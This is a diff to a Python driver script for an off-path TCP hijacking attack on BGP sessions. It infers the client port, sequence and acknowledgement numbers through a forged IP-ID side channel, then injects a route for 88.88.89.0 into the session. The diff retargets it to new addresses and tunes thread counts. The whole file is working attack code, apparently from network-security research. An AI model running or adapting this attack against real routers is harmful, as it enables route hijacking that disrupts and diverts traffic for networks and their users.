@@ -1,6 +1,8 @@
 # coding=utf-8
 
 import time
+import os
+import json
 
 from IPID_HCSC.connetcion_find import Connection_Finder
 from IPID_HCSC.seq_find import Seq_Finder
@@ -9,16 +11,17 @@ from IPID_HCSC.ack_find import *
 
 if __name__ == '__main__':
 
-    server_ip = '172.21.0.12'
+    server_ip = '172.21.0.125'
     server_port = 179
 
-    client_ip = '182.92.129.182'
+    client_ip = '172.21.0.70'
 
     attack_bind_if = 'eth0'
     own_ip_prefix = '10.10.0.0'
-    collision_ip = '10.10.8.150'
+    collision_ip = '10.10.9.185'
 
     connection = Connection_Finder(forge_ip=collision_ip, client_ip=client_ip, server_ip=server_ip,
+                                   block_size=500, num_thread=2, reverse=False,
                                    server_port=server_port, bind_if_name=attack_bind_if)
     connection.run()
     client_port = connection.result
@@ -30,7 +33,7 @@ if __name__ == '__main__':
     time.sleep(3)
     seq = Seq_Finder(forge_ip=collision_ip, client_ip=client_ip, server_ip=server_ip,
                      server_port=server_port, client_port=client_port,
-                     bind_ifname=attack_bind_if, verbose=True)
+                     bind_ifname=attack_bind_if, verbose=True, chunk_size=500, num_thread=3)
     seq.run()
     seq_in_win = seq.result
 
@@ -38,6 +41,7 @@ if __name__ == '__main__':
         print('Seq Find Miss')
         jstr = json.dumps({'res':0})
     else:
+        time.sleep(3)
         ack = Ack_Finder(forge_ip=collision_ip, client_ip=client_ip, server_ip=server_ip,
                          server_port=server_port, client_port=client_port, seq_in_win=seq_in_win,
                          bind_if_name=attack_bind_if)
@@ -45,8 +49,8 @@ if __name__ == '__main__':
         ack.run_attack_bgp()
         seq_num = ack.seq_num
         ack_num = ack.ack_in_win
-        attack_action_bgp(client_ip=client_ip, server_ip=server_ip, client_port=client_port,
-                          server_port=server_port, seq=seq_num, ack=ack_num)
+        attack_action_bgp(client_ip=client_ip, server_ip=server_ip, client_port=client_port, inject='88.88.89.0',
+                          server_port=server_port, seq=seq_num, ack=ack_num, ifname=attack_bind_if)
 
         print('------ Total Statistics ------')
         print('Time: ' + str(connection.cost_time + seq.cost_time + ack.cost_time) + ' (s)')
